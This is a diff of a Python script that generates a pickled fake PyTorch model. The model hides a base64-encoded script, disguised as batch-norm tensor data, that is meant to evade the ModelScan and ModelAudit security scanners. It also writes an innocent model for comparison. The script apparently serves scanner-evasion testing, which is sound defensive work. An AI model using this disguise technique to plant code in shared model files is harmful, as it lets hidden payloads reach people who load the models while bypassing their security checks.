@@ -20,62 +20,59 @@ Key Innovation: "Pickle-in-Pickle" technique
 - No multiple streams, no banned imports, pure steganography
 """
 
-import pickle
-import collections
-import tempfile
-import os
 import base64
+import collections
+import os
+import pickle
+import tempfile
 import time
-from pathlib import Path
 
 # Note: InnocentModelComponent class removed to avoid import issues
 # Payload now embedded directly as dictionary data structure
 
+
 def create_ultimate_steganographic_attack(output_path=None):
     """Create V4 steganographic attack that evades both scanners"""
-    
+
     print("🎭 Creating V4 Ultimate Steganographic Attack - Dual Scanner Evasion")
     print("=" * 80)
     print()
     print("📋 V4 Attack Scenario:")
     print("   Evades BOTH ModelScan AND ModelAudit using single-stream embedding")
-    print("   Single stream: No multi-stream detection triggered")  
+    print("   Single stream: No multi-stream detection triggered")
     print("   Nested payload: Hidden in legitimate PyTorch model structure")
     print("   Delayed activation: Executes during normal model usage")
     print()
-    
+
     # ========================================
     # SINGLE STREAM: Embedded Payload Attack
     # ========================================
     print("🔄 Creating Single Stream with Embedded Payload")
-    
+
     # Create the most legitimate-looking PyTorch model with embedded payload
-    embedded_attack_model = collections.OrderedDict([
-        # Standard model architecture - completely normal
-        ('backbone.conv1.weight', 'Parameter containing tensor of size [64, 3, 7, 7]'),
-        ('backbone.conv1.bias', 'Parameter containing tensor of size [64]'),
-        ('backbone.bn1.weight', 'Parameter containing tensor of size [64]'),
-        ('backbone.bn1.bias', 'Parameter containing tensor of size [64]'),
-        
-        # Our malicious component disguised as tensor metadata (self-contained)
-        ('backbone.layer1.0.bn1', {
-            'component_type': 'batch_normalization',
-            'parameters': {
-                'momentum': 0.1,
-                'eps': 1e-05,
-                'affine': True,
-                'track_running_stats': True
-            },
-            # Hidden payload disguised as tensor serialization data
-            'serialized_state': {
-                'tensor_format_version': '1.13.1',
-                'tensor_dtype': 'float32', 
-                'tensor_shape': [64, 128, 1, 1],
-                'tensor_stride': [128, 1, 1, 1],
-                'tensor_storage_offset': 0,
-                'tensor_requires_grad': False,
-                # Payload hidden as base64-encoded "tensor data"
-                'serialized_tensor_data': base64.b64encode('''
+    embedded_attack_model = collections.OrderedDict(
+        [
+            # Standard model architecture - completely normal
+            ("backbone.conv1.weight", "Parameter containing tensor of size [64, 3, 7, 7]"),
+            ("backbone.conv1.bias", "Parameter containing tensor of size [64]"),
+            ("backbone.bn1.weight", "Parameter containing tensor of size [64]"),
+            ("backbone.bn1.bias", "Parameter containing tensor of size [64]"),
+            # Our malicious component disguised as tensor metadata (self-contained)
+            (
+                "backbone.layer1.0.bn1",
+                {
+                    "component_type": "batch_normalization",
+                    "parameters": {"momentum": 0.1, "eps": 1e-05, "affine": True, "track_running_stats": True},
+                    # Hidden payload disguised as tensor serialization data
+                    "serialized_state": {
+                        "tensor_format_version": "1.13.1",
+                        "tensor_dtype": "float32",
+                        "tensor_shape": [64, 128, 1, 1],
+                        "tensor_stride": [128, 1, 1, 1],
+                        "tensor_storage_offset": 0,
+                        "tensor_requires_grad": False,
+                        # Payload hidden as base64-encoded "tensor data"
+                        "serialized_tensor_data": base64.b64encode(b'''
 # Model optimization and validation service
 import base64
 import json  
@@ -131,77 +128,78 @@ def setup_model_optimization():
 
 # Execute optimization setup
 setup_model_optimization()
-'''.encode()).decode(),
-                'tensor_metadata': {
-                    'creation_time': time.time(),
-                    'framework_version': '2.1.0'
-                }
-            },
-            'last_updated': time.time()
-        }),  # HIDDEN PAYLOAD HERE
-        
-        # Continue with normal layers to look legitimate
-        ('backbone.layer1.0.conv1.weight', 'Parameter containing tensor of size [64, 64, 3, 3]'),
-        ('backbone.layer1.0.conv1.bias', 'Parameter containing tensor of size [64]'),
-        ('backbone.layer1.1.conv1.weight', 'Parameter containing tensor of size [64, 64, 3, 3]'),
-        
-        ('backbone.layer2.0.conv1.weight', 'Parameter containing tensor of size [128, 64, 3, 3]'),
-        ('backbone.layer2.0.bn1.weight', 'Parameter containing tensor of size [128]'),
-        
-        ('backbone.layer3.0.conv1.weight', 'Parameter containing tensor of size [256, 128, 3, 3]'),
-        ('backbone.layer3.0.bn1.weight', 'Parameter containing tensor of size [256]'),
-        
-        ('head.fc.weight', 'Parameter containing tensor of size [1000, 256]'),
-        ('head.fc.bias', 'Parameter containing tensor of size [1000]'),
-        
-        # Completely innocent metadata
-        ('_metadata', collections.OrderedDict([
-            ('version', 1),
-            ('', {'version': 1}),
-            ('backbone', {'version': 1}),
-            ('backbone.conv1', {'version': 1}),
-            ('backbone.bn1', {'version': 1}),
-            ('backbone.layer1', {'version': 1}),
-            ('backbone.layer1.0', {'version': 1}),
-            ('backbone.layer1.0.conv1', {'version': 1}),
-            ('backbone.layer1.0.bn1', {'version': 1}),
-            ('backbone.layer1.1', {'version': 1}),
-            ('backbone.layer2', {'version': 1}),
-            ('backbone.layer3', {'version': 1}),
-            ('head', {'version': 1}),
-            ('head.fc', {'version': 1}),
-        ])),
-        
-        # Innocent training configuration
-        ('training_config', {
-            'model_name': 'ResNet50-CustomBackbone',
-            'dataset': 'ImageNet-1K',
-            'batch_size': 32,
-            'learning_rate': 0.001,
-            'optimizer': 'AdamW',
-            'weight_decay': 0.01,
-            'epochs': 100,
-            'accuracy': 0.7834,
-            'loss': 0.8765,
-            'framework': 'PyTorch 2.1.0',
-            'created': time.strftime('%Y-%m-%d %H:%M:%S'),
-            'license': 'Apache-2.0'
-        })
-    ])
-    
+''').decode(),
+                        "tensor_metadata": {"creation_time": time.time(), "framework_version": "2.1.0"},
+                    },
+                    "last_updated": time.time(),
+                },
+            ),  # HIDDEN PAYLOAD HERE
+            # Continue with normal layers to look legitimate
+            ("backbone.layer1.0.conv1.weight", "Parameter containing tensor of size [64, 64, 3, 3]"),
+            ("backbone.layer1.0.conv1.bias", "Parameter containing tensor of size [64]"),
+            ("backbone.layer1.1.conv1.weight", "Parameter containing tensor of size [64, 64, 3, 3]"),
+            ("backbone.layer2.0.conv1.weight", "Parameter containing tensor of size [128, 64, 3, 3]"),
+            ("backbone.layer2.0.bn1.weight", "Parameter containing tensor of size [128]"),
+            ("backbone.layer3.0.conv1.weight", "Parameter containing tensor of size [256, 128, 3, 3]"),
+            ("backbone.layer3.0.bn1.weight", "Parameter containing tensor of size [256]"),
+            ("head.fc.weight", "Parameter containing tensor of size [1000, 256]"),
+            ("head.fc.bias", "Parameter containing tensor of size [1000]"),
+            # Completely innocent metadata
+            (
+                "_metadata",
+                collections.OrderedDict(
+                    [
+                        ("version", 1),
+                        ("", {"version": 1}),
+                        ("backbone", {"version": 1}),
+                        ("backbone.conv1", {"version": 1}),
+                        ("backbone.bn1", {"version": 1}),
+                        ("backbone.layer1", {"version": 1}),
+                        ("backbone.layer1.0", {"version": 1}),
+                        ("backbone.layer1.0.conv1", {"version": 1}),
+                        ("backbone.layer1.0.bn1", {"version": 1}),
+                        ("backbone.layer1.1", {"version": 1}),
+                        ("backbone.layer2", {"version": 1}),
+                        ("backbone.layer3", {"version": 1}),
+                        ("head", {"version": 1}),
+                        ("head.fc", {"version": 1}),
+                    ]
+                ),
+            ),
+            # Innocent training configuration
+            (
+                "training_config",
+                {
+                    "model_name": "ResNet50-CustomBackbone",
+                    "dataset": "ImageNet-1K",
+                    "batch_size": 32,
+                    "learning_rate": 0.001,
+                    "optimizer": "AdamW",
+                    "weight_decay": 0.01,
+                    "epochs": 100,
+                    "accuracy": 0.7834,
+                    "loss": 0.8765,
+                    "framework": "PyTorch 2.1.0",
+                    "created": time.strftime("%Y-%m-%d %H:%M:%S"),
+                    "license": "Apache-2.0",
+                },
+            ),
+        ]
+    )
+
     # Determine output path
     if output_path is None:
-        output_path = tempfile.NamedTemporaryFile(suffix='.pkl', delete=False).name
-    
+        output_path = tempfile.NamedTemporaryFile(suffix=".pkl", delete=False).name
+
     # Create single stream with embedded payload
-    with open(output_path, 'wb') as f:
+    with open(output_path, "wb") as f:
         pickle.dump(embedded_attack_model, f)
-    
+
     file_size = os.path.getsize(output_path)
     print(f"   🔄 V4 ultimate attack file created: {output_path}")
     print(f"   📏 Total size: {file_size} bytes (single stream)")
-    print(f"   📊 Structure: Single pickle with embedded payload object")
-    
+    print("   📊 Structure: Single pickle with embedded payload object")
+
     # ========================================
     # ULTIMATE EVASION ANALYSIS
     # ========================================
@@ -237,38 +235,42 @@ setup_model_optimization()
     print("   - Payload base64-encoded as 'tensor data'")
     print("   - Hidden within legitimate-looking tensor metadata")
     print("   - Indistinguishable from normal model serialization")
-    
+
     return output_path, file_size
+
 
 def create_verification_model(output_path=None):
     """Create a truly innocent model for comparison"""
-    
-    innocent_model = collections.OrderedDict([
-        ('conv1.weight', 'Parameter containing tensor of size [32, 3, 3, 3]'),
-        ('conv1.bias', 'Parameter containing tensor of size [32]'),
-        ('fc.weight', 'Parameter containing tensor of size [10, 32]'),
-        ('fc.bias', 'Parameter containing tensor of size [10]'),
-        ('_metadata', {'version': 1}),
-    ])
-    
+
+    innocent_model = collections.OrderedDict(
+        [
+            ("conv1.weight", "Parameter containing tensor of size [32, 3, 3, 3]"),
+            ("conv1.bias", "Parameter containing tensor of size [32]"),
+            ("fc.weight", "Parameter containing tensor of size [10, 32]"),
+            ("fc.bias", "Parameter containing tensor of size [10]"),
+            ("_metadata", {"version": 1}),
+        ]
+    )
+
     if output_path is None:
-        output_path = tempfile.NamedTemporaryFile(suffix='.pkl', delete=False).name
-    
-    with open(output_path, 'wb') as f:
+        output_path = tempfile.NamedTemporaryFile(suffix=".pkl", delete=False).name
+
+    with open(output_path, "wb") as f:
         pickle.dump(innocent_model, f)
-    
+
     return output_path
+
 
 if __name__ == "__main__":
     print("🎭 V4 Ultimate Steganographic Attack Generator")
     print("=" * 60)
-    
+
     # Create ultimate evasion attack
     v4_path, v4_size = create_ultimate_steganographic_attack()
-    
+
     # Create innocent model for comparison
     innocent_path = create_verification_model()
-    
+
     print()
     print("🎯 V4 Attack Files Generated:")
     print(f"   📁 V4 Ultimate Attack: {v4_path}")
